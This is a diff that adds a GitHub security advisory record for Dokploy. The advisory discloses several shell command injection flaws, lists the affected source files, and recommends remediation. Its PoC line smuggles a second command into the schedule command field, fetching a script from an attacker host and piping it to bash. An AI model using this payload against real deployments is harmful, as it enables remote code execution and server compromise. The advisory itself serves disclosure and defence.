@@ -1,0 +1,44 @@
+{
+  "global": null,
+  "id": "GHSA-9f4v-6m79-92m8",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "## Summary\nMultiple command injection vulnerabilities exist in Dokploy where user-controlled input is interpolated directly into shell command strings executed via execAsync/execAsyncRemote. A safe pattern (spawnAsync with array arguments) exists in some code paths but is inconsistently applied.\n\n## Details\n\n### 1. Schedule Command Injection (Remote Path)\nFile: packages/server/src/utils/schedules/utils.ts:80-81\n\nThe LOCAL execution path safely uses spawnAsync with array arguments (line 106-108), but the REMOTE execution path interpolates command directly into a shell string passed to execAsyncRemote via SSH conn.exec().\n\nInput source: schedule.command field via tRPC scheduleRouter.create/update. Schema: z.string() with no sanitization.\n\n### 2. Compose Command Injection\nFile: packages/server/src/utils/builders/compose.ts:57\n\nDocker command is interpolated directly. The sanitizeCommand() function only trims whitespace and strips surrounding double-quotes - zero protection against shell metacharacters.\n\n### 3. Git URL/Branch Injection\nFile: packages/server/src/utils/providers/git.ts:81\n\nBoth customGitBranch and customGitUrl are interpolated without escaping into git clone commands. Same pattern in gitlab.ts, github.ts, gitea.ts, bitbucket.ts.\n\n### 4. Docker Image Name Injection\nFile: packages/server/src/utils/providers/docker.ts:24\n\ndockerImage interpolated into docker pull command. Same in libsql.ts, mongo.ts, mariadb.ts, mysql.ts, postgres.ts, redis.ts.\n\n## PoC\nSet schedule.command to: `'; curl attacker.com/shell.sh | bash; echo '` targeting a remote server.\n\n## Impact\n- Remote Code Execution on host servers and connected remote servers\n- Full compromise of all deployed services\n- Any authenticated user with project-level permissions can exploit (not admin-only)\n\n## Remediation\n1. Replace all shell string interpolation with spawnAsync using array arguments\n2. Add strict input validation with allowlists\n3. Validate dockerImage against Docker image name spec",
+    "ghsa_id": "GHSA-9f4v-6m79-92m8",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-9f4v-6m79-92m8",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-9f4v-6m79-92m8"
+      }
+    ],
+    "published_at": "2026-11-12T08:17:48Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Multiple Command Injection vulnerabilities via Shell String Interpolation",
+    "updated_at": "2026-11-12T08:17:48Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "dokploy"
+        },
+        "patched_versions": "0.31.1",
+        "vulnerable_version_range": "< 0.31.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
